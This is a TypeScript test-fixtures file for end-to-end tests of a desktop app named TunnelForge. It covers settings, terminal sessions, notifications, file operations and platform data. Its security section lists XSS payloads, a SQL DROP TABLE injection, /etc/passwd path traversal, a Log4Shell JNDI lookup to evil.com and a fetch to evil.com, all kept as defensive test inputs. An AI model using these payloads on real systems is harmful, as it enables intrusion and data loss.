/**
 * Test data fixtures for WebView integration tests
 */

export interface TestSettings {
  theme: 'dark' | 'light' | 'auto';
  serverPort: number;
  autoStart: boolean;
  notifications: {
    enabled: boolean;
    sound: boolean;
    desktop: boolean;
  };
  tunnels: {
    ngrok: {
      enabled: boolean;
      authToken?: string;
    };
    cloudflare: {
      enabled: boolean;
      token?: string;
    };
    tailscale: {
      enabled: boolean;
    };
  };
}

export interface TestTerminalSession {
  id: string;
  title: string;
  shell: string;
  cols: number;
  rows: number;
  env: Record<string, string>;
}

export interface TestNotification {
  title: string;
  body: string;
  icon?: string;
  sound?: string;
  tag?: string;
  actions?: Array<{
    id: string;
    title: string;
  }>;
}

export interface TestFileOperation {
  path: string;
  content?: string;
  operation: 'read' | 'write' | 'delete' | 'exists';
}

// Default test settings
export const DEFAULT_TEST_SETTINGS: TestSettings = {
  theme: 'dark',
  serverPort: 4021,
  autoStart: false,
  notifications: {
    enabled: true,
    sound: true,
    desktop: true
  },
  tunnels: {
    ngrok: {
      enabled: false
    },
    cloudflare: {
      enabled: false
    },
    tailscale: {
      enabled: false
    }
  }
};

// Test terminal session configurations
export const TEST_TERMINAL_SESSIONS: TestTerminalSession[] = [
  {
    id: 'test-session-1',
    title: 'Basic Test Terminal',
    shell: '/bin/bash',
    cols: 80,
    rows: 24,
    env: {
      TERM: 'xterm-256color',
      LANG: 'en_US.UTF-8'
    }
  },
  {
    id: 'test-session-2',
    title: 'Large Test Terminal',
    shell: '/bin/bash',
    cols: 120,
    rows: 40,
    env: {
      TERM: 'xterm-256color',
      LANG: 'en_US.UTF-8',
      CUSTOM_VAR: 'test_value'
    }
  },
  {
    id: 'test-session-3',
    title: 'Zsh Test Terminal',
    shell: '/bin/zsh',
    cols: 100,
    rows: 30,
    env: {
      TERM: 'xterm-256color',
      LANG: 'en_US.UTF-8',
      SHELL: '/bin/zsh'
    }
  }
];

// Test notification templates
export const TEST_NOTIFICATIONS: TestNotification[] = [
  {
    title: 'TunnelForge E2E Test',
    body: 'This is a basic test notification from WebView E2E tests',
    icon: 'info',
    sound: 'default'
  },
  {
    title: 'TunnelForge Action Required',
    body: 'This notification requires user action',
    icon: 'warning',
    sound: 'alert',
    actions: [
      { id: 'open', title: 'Open TunnelForge' },
      { id: 'dismiss', title: 'Dismiss' }
    ]
  },
  {
    title: 'TunnelForge Success',
    body: 'Operation completed successfully',
    icon: 'success',
    sound: 'success',
    tag: 'success-notification'
  }
];

// Test file operations
export const TEST_FILE_OPERATIONS: TestFileOperation[] = [
  {
    path: 'test-basic.txt',
    content: 'Basic test file content\nCreated: ' + new Date().toISOString(),
    operation: 'write'
  },
  {
    path: 'test-large.txt',
    content: 'Large test file\n' + 'Line '.repeat(1000) + '\nEnd of large file',
    operation: 'write'
  },
  {
    path: 'test-special-chars.txt',
    content: 'Special characters: !@#$%^&*()[]{}|\\:;\'"<>,.?/~`\nUnicode: ñáéíóú 中文 🚀',
    operation: 'write'
  },
  {
    path: 'config.json',
    content: JSON.stringify({
      name: 'TunnelForge Test Config',
      version: '1.0.0',
      settings: DEFAULT_TEST_SETTINGS
    }, null, 2),
    operation: 'write'
  }
];

// Platform-specific test data
export const PLATFORM_TEST_DATA = {
  windows: {
    paths: [
      'C:\\Program Files\\TunnelForge',
      'C:\\Users\\Test\\AppData\\Roaming\\TunnelForge',
      'D:\\Projects\\tunnelforge'
    ],
    commands: [
      'echo "Windows test"',
      'dir',
      'whoami'
    ],
    registryKeys: [
      'HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion',
      'HKEY_LOCAL_MACHINE\\SOFTWARE\\TunnelForge'
    ]
  },
  macos: {
    paths: [
      '/Applications/TunnelForge.app',
      '/Users/test/Library/Application Support/TunnelForge',
      '/Users/test/.config/tunnelforge'
    ],
    commands: [
      'echo "macOS test"',
      'ls -la',
      'whoami'
    ],
    bundleInfo: {
      identifier: 'dev.tunnelforge.desktop',
      version: '1.0.0'
    }
  },
  linux: {
    paths: [
      '/usr/local/bin/tunnelforge',
      '/home/user/.config/tunnelforge',
      '/opt/tunnelforge'
    ],
    commands: [
      'echo "Linux test"',
      'ls -la',
      'whoami'
    ],
    distributions: ['ubuntu', 'fedora', 'arch', 'debian'],
    packageManagers: ['apt', 'yum', 'dnf', 'pacman', 'zypper']
  }
};

// Performance test data
export const PERFORMANCE_TEST_DATA = {
  commandSets: [
    ['get_app_info', 'get_settings', 'get_server_status'],
    ['get_platform_info', 'get_terminal_sessions', 'get_performance_metrics'],
    ['get_server_logs', 'get_memory_usage', 'get_system_info']
  ],
  loadTestConfigs: [
    { duration: 5000, interval: 100, commands: 50 },
    { duration: 10000, interval: 200, commands: 100 },
    { duration: 30000, interval: 500, commands: 200 }
  ],
  memoryTestConfigs: [
    { iterations: 10, sessionsPerIteration: 5 },
    { iterations: 20, sessionsPerIteration: 10 },
    { iterations: 50, sessionsPerIteration: 20 }
  ]
};

// Error test data
export const ERROR_TEST_DATA = {
  invalidCommands: [
    'nonexistent_command',
    'invalid_command_name',
    'command_that_does_not_exist'
  ],
  invalidArguments: [
    { command: 'set_settings', args: [{ invalid: 'data' }] },
    { command: 'get_terminal_session_details', args: ['invalid-session-id'] },
    { command: 'resize_terminal', args: ['session-id', 0, -1] }
  ],
  resourceExhaustion: {
    maxTerminalSessions: 100,
    largeFileOperations: 1000,
    rapidCommandExecution: 1000
  }
};

// Accessibility test data
export const ACCESSIBILITY_TEST_DATA = {
  requiredElements: [
    'html[lang]',
    'title',
    'main, [role="main"]',
    'nav, [role="navigation"]',
    'button[aria-label]',
    'img[alt]'
  ],
  keyboardNavigation: [
    { key: 'Tab', expected: 'focus moves to next element' },
    { key: 'Shift+Tab', expected: 'focus moves to previous element' },
    { key: 'Enter', expected: 'activates focused element' },
    { key: 'Space', expected: 'activates focused element' }
  ],
  colorContrast: {
    minimumRatio: 4.5,
    largeTextRatio: 3.0
  }
};

// Security test data
export const SECURITY_TEST_DATA = {
  xssPayloads: [
    '<script>alert("xss")</script>',
    'javascript:alert("xss")',
    '<img src=x onerror=alert("xss")>',
    '"><script>alert("xss")</script>'
  ],
  injectionPayloads: [
    "'; DROP TABLE users; --",
    '../../../etc/passwd',
    '${jndi:ldap://evil.com/a}',
    '{{7*7}}'
  ],
  cspTests: [
    { script: 'eval("test")', shouldBlock: true },
    { script: 'document.write("test")', shouldBlock: false },
    { script: 'fetch("https://evil.com")', shouldBlock: true }
  ]
};

// Utility functions for test data
export function getRandomTestSettings(): TestSettings {
  return {
    ...DEFAULT_TEST_SETTINGS,
    theme: ['dark', 'light', 'auto'][Math.floor(Math.random() * 3)] as 'dark' | 'light' | 'auto',
    serverPort: 4021 + Math.floor(Math.random() * 100),
    autoStart: Math.random() > 0.5,
    notifications: {
      enabled: Math.random() > 0.5,
      sound: Math.random() > 0.5,
      desktop: Math.random() > 0.5
    }
  };
}

export function getRandomTestNotification(): TestNotification {
  const templates = [...TEST_NOTIFICATIONS];
  const template = templates[Math.floor(Math.random() * templates.length)];
  
  return {
    ...template,
    title: template.title + ' ' + Date.now(),
    body: template.body + ' (Timestamp: ' + new Date().toISOString() + ')'
  };
}

export function getRandomTerminalSession(): TestTerminalSession {
  const templates = [...TEST_TERMINAL_SESSIONS];
  const template = templates[Math.floor(Math.random() * templates.length)];
  
  return {
    ...template,
    id: 'test-session-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9),
    title: template.title + ' ' + Date.now()
  };
}

export function getPlatformTestData(platform: string) {
  switch (platform.toLowerCase()) {
    case 'win32':
    case 'windows':
      return PLATFORM_TEST_DATA.windows;
    case 'darwin':
    case 'macos':
      return PLATFORM_TEST_DATA.macos;
    case 'linux':
      return PLATFORM_TEST_DATA.linux;
    default:
      return PLATFORM_TEST_DATA.linux; // Default to Linux
  }
}

export function generateTestFileName(prefix: string = 'test', extension: string = 'txt'): string {
  return `${prefix}-${Date.now()}-${Math.random().toString(36).substr(2, 9)}.${extension}`;
}

export function generateLargeTestContent(size: number = 10000): string {
  const lines = [];
  for (let i = 0; i < size; i++) {
    lines.push(`Line ${i + 1}: This is test line ${i + 1} with some content to make it longer.`);
  }
  return lines.join('\n');
}